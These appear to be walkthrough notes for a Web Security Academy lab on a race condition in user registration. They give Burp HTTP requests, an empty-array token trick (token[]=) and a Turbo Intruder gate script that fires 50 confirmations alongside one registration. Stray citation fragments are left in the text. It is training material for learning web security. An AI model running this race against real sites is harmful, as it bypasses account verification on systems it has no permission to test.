# Payload 05 – Partial Construction Race

## Registration Endpoint

```http
POST /register
```

---

## Confirmation Endpoint

```http
POST /confirm?token[]= 
```

The source uses the empty-array parameter structure:

```http
POST /confirm?token[]=
```

This can produce:

```text
Invalid token: Array
```

and demonstrates that the application accepts an array rather than a normal string token. :contentReference[oaicite:7]{index=7}

---

## Race Structure

```text
POST /register
       ↓
Create user
       ↓
RACE WINDOW
       ↓
Initialize registration token
```

During the temporary state:

```text
User exists
Token = uninitialized
```

a confirmation request may interact with the incomplete object.

---

## Burp Requests

Registration:

```http
POST /register HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=User1&email=user@ginandjuice.shop&password=PASSWORD
```

Confirmation:

```http
POST /confirm?token[]=
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: phpsessionid=YOUR-SESSION
Content-Length: 0
```

---

## Turbo Intruder Strategy

Queue:

```text
1 registration request
+
50 confirmation requests
```

using the same gate.

Concept:

```text
Registration ───────┐
                    │
Confirmation ×50 ───┤
                    ↓
               Race Window
```

The source's example uses:

```python
for i in range(50):
    engine.queue(confirmationReq, gate=currentAttempt)
```

and then releases the group with:

```python
engine.openGate(currentAttempt)
```

:contentReference[oaicite:8]{index=8}

---

## Success Indicator

Look for:

```text
HTTP 200
```

and:

```text
Account registration for user <USERNAME> successful
```

in the confirmation response. :contentReference[oaicite:9]{index=9}